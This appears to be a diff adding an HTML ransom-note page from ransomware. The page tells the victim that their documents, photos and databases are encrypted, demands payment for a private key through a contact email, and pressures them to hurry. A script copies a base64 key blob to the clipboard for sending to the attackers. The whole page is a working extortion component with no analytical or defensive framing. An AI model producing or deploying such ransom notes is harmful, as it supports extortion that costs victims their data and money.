@@ -1,0 +1,120 @@
+<html>
+<head>
+<script>
+
+function CopyToClipboard(containerid) {
+  if (document.selection) {
+    var range = document.body.createTextRange();
+    range.moveToElementText(document.getElementById(containerid));
+    range.select().createTextRange();
+    document.execCommand("copy");
+
+  } else if (window.getSelection) {
+    var range = document.createRange();
+    range.selectNode(document.getElementById(containerid));
+    window.getSelection().addRange(range);
+    document.execCommand("copy");
+    alert("Base64 copied into the clipboard!")
+  }
+}
+
+</script>
+<style>
+ html{ margin:0; padding:0; width:100%; height:100%; }
+ body {  background: #000080; color: #ececec; font-family: Consolas };
+
+.tooltip {
+  position: relative;
+  display: inline-block;
+  border-bottom: 1px dotted black;
+}
+
+.tooltip .tooltiptext {
+  visibility: hidden;
+  width: 120px;
+  background-color: #555;
+  color: #fff;
+  text-align: center;
+  border-radius: 6px;
+  padding: 5px 0;
+  position: absolute;
+  z-index: 1;
+  bottom: 125%;
+  left: 50%;
+  margin-left: -60px;
+  opacity: 0;
+  transition: opacity 0.3s;
+}
+
+.tooltip .tooltiptext::after {
+  content: "";
+  position: absolute;
+  top: 100%;
+  left: 50%;
+  margin-left: -5px;
+  border-width: 5px;
+  border-style: solid;
+  border-color: #555 transparent transparent transparent;
+}
+
+.tooltip:hover .tooltiptext {
+  visibility: visible;
+  opacity: 1;
+}
+
+p#base64{
+
+    -ms-word-break: break-all;
+    word-break: break-all;
+
+    -webkit-hyphens: auto;
+       -moz-hyphens: auto;
+        -ms-hyphens: auto;
+            hyphens: auto;
+}
+
+p#base64:hover{
+	cursor: hand;
+}
+</style>
+</head>
+<body>
+
+<table style="position: absolute;" width="100%">
+<tr>
+<td style="width: 25%;">
+
+<span class="left" style="font-size: 14px; font-weight: bold">CODE:
+<br>------
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+<br>00000&nbsp;00000
+</span>
+</td>
+<td style="width: 50%;">
+<div style="text-align: center; font-size: 20px;">
+<p><s>0010 SYSTEM FAILURE 0010</s></p>
+
+<p>*********************************************************************************************************************</p>
+<p>Attention! Your documents, photos, databases, and other important files have been encrypted!</p>
+<p>*********************************************************************************************************************</p>
+<br>
+
+</div>
+
+<div style="text-align: center; font-size: 18px;">
+<p>The only way to decrypt your files, is to buy the private key from us.</p>
+<p>You can decrypt one of your files for free, as a proof that we have the method to decrypt the rest of your data.</p>
+<p>In order to receive the private key contact us via email: <br> <b>getmyfilesback@airmail.cc</b> </p>
+
+<p>Remember to hurry up, as your email address may not be avaliable for very long.<br>Buying the key immediatly will guarantee that 100% of your files will be restored.</p>
+<p>Below you will see a big base64 blob, you will need to email us and copy this blob to us.<br>you can click on it, and it will be copied into the clipboard.</p>
+<p>If you have troubles copying it, just send us the file you are currently reading, as an attachment.</p>
+<br>
+<p>Base64: </p>
+</div><div style="text-align: center; font-size: 12px;"><p id="base64" onclick="return CopyToClipboard('base64')" class="tooltip">...8iNElgvZWCM9q7lfOks9P0W+fYWqha1lrrx+Y5hsvzE5bMVEyWBzini9lzM1w3cBKXV6Fi2JBRRjCHOCxfAB/s1wg8pY+Rt9LkpUDZd6Zh7TXAuVFI3gtlYHYd2GYb45I4s6fgU0LigbN6FNoXvv0lblhu4w49s2rdcCRcAMgn9LjiMTE...QAwADkANQA1ADkAYwA4AGIAZgAzADAAOQAAABCAYBoKdQBzAGUAcgAAACISVQBTAEUAUgAyAC0AUA...gBfAEYAXwAxADgAMgAyAC8AMQA4ADk...wAvADEAOAA0...==<span class="tooltiptext">Click here to copy</span></p></div></td><td style="width: 25%; text-align: right;"><span class="right" style="font-size: 14px; font-weight: bold">IMMINENT SHUTDOWN:<br>------<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00<br>00000&nbsp;00000&nbsp;0&nbsp;00</span></td></tr></table></body></html>
